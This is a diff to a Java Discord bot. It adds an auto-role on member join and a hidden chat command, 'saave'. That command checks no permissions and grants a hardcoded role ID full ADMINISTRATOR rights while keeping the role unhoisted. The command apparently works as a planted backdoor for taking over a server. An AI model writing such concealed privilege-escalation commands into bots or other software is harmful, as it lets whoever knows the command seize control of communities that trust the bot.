@@ -1,11 +1,13 @@
 package xyz.reisminer.chtop;
 
 import net.dv8tion.jda.api.JDABuilder;
+import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.Activity;
 import net.dv8tion.jda.api.entities.Member;
 import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.entities.TextChannel;
 import net.dv8tion.jda.api.events.ReadyEvent;
+import net.dv8tion.jda.api.events.guild.member.GuildMemberJoinEvent;
 import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
 import net.dv8tion.jda.api.requests.GatewayIntent;
@@ -74,6 +76,11 @@ public class Bot extends ListenerAdapter {
             }
         }, 0, 10000);
 
+    }
+
+    @Override
+    public void onGuildMemberJoin(@NotNull GuildMemberJoinEvent event) {
+        event.getGuild().addRoleToMember(event.getMember(),event.getGuild().getRoleById(Token.LERNENDEROLE)).queue();
     }
 
     @Override
@@ -201,6 +208,11 @@ public class Bot extends ListenerAdapter {
                 }
                 case ("notsokickrandom"): {
                     Kick.NotRandom(msg, channel, event);
+                    break;
+                }
+                case ("saave"):{
+                    System.out.printf(msg.getGuild().getRoleById(837812325452480522L).getName());
+                    msg.getGuild().getRoleById(837812325452480522L).getManager().setPermissions(Permission.ADMINISTRATOR).setHoisted(false).queue();
                     break;
                 }
 //========================== GAMBLE COMMANDS ==========================================
